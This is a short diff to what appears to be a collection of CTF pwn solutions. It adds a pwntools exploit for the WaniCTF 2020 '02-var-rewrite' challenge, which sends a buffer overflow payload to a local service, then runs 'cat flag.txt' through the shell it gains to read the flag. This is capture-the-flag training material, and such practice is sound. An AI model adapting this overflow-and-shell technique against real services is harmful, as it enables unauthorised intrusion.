@@ -99,3 +99,19 @@ io.recvuntil(b"FLAG{")
 log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
 io.close()
 ```
+
+## 02-var-rewrite
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/02-var-rewrite
+
+```python
+#!/usr/bin/env python3
+from pwn import context, log, remote
+context.log_level = "debug"
+io = remote("::1", 9002)
+io.sendlineafter(b"What's your name?: ", b"Y"*(0x16-0xc)+b"WANI")
+io.sendlineafter(b"Congratulation!", b"cat flag.txt")
+io.recvuntil(b"FLAG{")
+log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
+io.close()
+```
